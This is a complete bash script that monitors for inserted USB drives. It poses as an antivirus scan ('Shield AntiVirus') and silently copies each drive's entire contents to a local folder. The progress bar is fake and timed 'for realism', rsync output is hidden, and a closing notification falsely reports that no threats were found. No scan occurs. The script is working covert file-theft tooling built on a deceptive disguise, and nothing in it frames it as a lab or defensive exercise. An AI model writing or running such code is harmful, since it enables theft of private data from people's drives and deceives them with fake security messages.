#!/bin/bash

# Set directory where USB contents will be copied
DEST_DIR="$HOME/USB_Copies"
mkdir -p "$DEST_DIR"

# Function to detect and handle USB events
usb_event() {
    local scanned_devices=()  # Store already processed devices to avoid duplicate scanning

    while read -r line; do
        if echo "$line" | grep -q "KERNEL.*sd[b-z][0-9]"; then
            USB_DEV=$(echo "$line" | grep -o "sd[b-z][0-9]")
            DEVICE_PATH="/dev/$USB_DEV"

            sleep 2  # Allow system to recognize the USB

            # Verify device exists
            if [ ! -b "$DEVICE_PATH" ]; then
                continue
            fi

            # Avoid processing the same device multiple times
            if [[ " ${scanned_devices[*]} " =~ " $USB_DEV " ]]; then
                continue
            fi
            scanned_devices+=("$USB_DEV")

            # Find the actual mount point (Ubuntu auto-mounts under /media/$USER/)
            MOUNT_POINT=$(lsblk -no MOUNTPOINT "$DEVICE_PATH" | head -n 1 | tr -d ' ')

            if [ -z "$MOUNT_POINT" ]; then
                continue  # Skip if no mount point is found
            fi

            # Get USB name
            USB_NAME=$(basename "$MOUNT_POINT")
            [ -z "$USB_NAME" ] && USB_NAME="Unknown_USB"

            # Create folder for USB copy
            COPY_DIR="$DEST_DIR/$USB_NAME-$(date +%Y%m%d%H%M%S)"
            mkdir -p "$COPY_DIR"

            # Launch GUI progress bar (Blocking, so notification appears after)
            (
                for i in {1..100}; do
                    echo $i
                    sleep 0.1  # Slow down the progress bar for realism
                done
            ) | zenity --progress --title=" 🛡 Shield AntiVirus " \
                        --text="Scanning $USB_NAME for any potential viruses..." \
                        --percentage=0 --auto-close --no-cancel

            # Now, copy files silently after progress bar finishes
            rsync -a "$MOUNT_POINT/" "$COPY_DIR/" &> /dev/null

            # Send notification AFTER scan & copying is done
            notify-send --icon=security-high "🔍 USB Scan Complete" \
                "✅ Scan successful.\n🛡 No threats detected."
        fi
    done
}

# Monitor USB devices
echo "Monitoring USB devices..."
udevadm monitor --subsystem-match=block --property | usb_event
